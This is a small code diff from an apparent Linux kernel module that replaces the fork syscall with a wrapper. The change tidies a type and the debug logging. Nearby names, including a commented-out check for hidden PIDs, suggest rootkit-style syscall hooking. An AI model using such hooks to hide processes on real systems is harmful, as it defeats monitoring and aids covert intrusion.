@@ -545,14 +545,14 @@ asmlinkage long new_sys_clone(unsigned long flags, void *child_stack,
 
 asmlinkage long new_sys_fork(void)
 {
-	long pid;
+	pid_t pid;
 	//register int pid_hidden = is_pid_hidden_no_getpid(ksyms.old_sys_getpid());
 
 	//SYS_STATS_INC(fork);
 
 	pid = ksyms.old_sys_fork();
 	if (pid)
-		printk("%ld\n", pid);
+		pr_debug("%s: pid=%d", __func__, pid);
 
 	return pid;
 }
